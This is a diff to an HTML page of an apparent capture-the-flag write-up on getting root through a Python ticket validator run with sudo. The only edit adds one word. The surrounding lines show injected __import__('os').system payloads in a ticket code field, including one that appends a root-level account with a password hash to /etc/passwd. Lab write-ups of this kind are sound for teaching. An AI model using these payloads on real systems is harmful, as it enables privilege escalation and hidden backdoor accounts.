@@ -113,7 +113,7 @@ layout: default
 
     <pre># Skytrain Inc&#13;&#10;## Ticket to root&#13;&#10;__Ticket Code:__&#13;&#10;**11+1,__import__(&apos;os&apos;).system(&apos;touch /tmp/test321&apos;)</pre>
 
-    <li>On the 4th line I have 11 because when it is divided by 7 there is a remainder of 4.  I have +1 after that because I needed to separate the <code>,__import__('os').system('touch /tmp/test321')</code> in order for the script to parse the command correctly.  Running the command <code>sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> and inputing /tmp/x.md creates the root owned file /tmp/test321.  This means we have arbitrary code execution as root.  I choose to create a 2nd root user in the /etc/passwd file.</li>
+    <li>On the 4th line I have 11 because when it is divided by 7 there is a remainder of 4.  I have +1 after that because I needed to separate the <code>,__import__('os').system('touch /tmp/test321')</code> part in order for the script to parse the command correctly.  Running the command <code>sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> and inputing /tmp/x.md creates the root owned file /tmp/test321.  This means we have arbitrary code execution as root.  I choose to create a 2nd root user in the /etc/passwd file.</li>
 
     <pre># Skytrain Inc&#13;&#10;## Ticket to root&#13;&#10;__Ticket Code:__&#13;&#10;**11+1,__import__(&apos;os&apos;).system(&apos;echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&apos;)</pre>
 
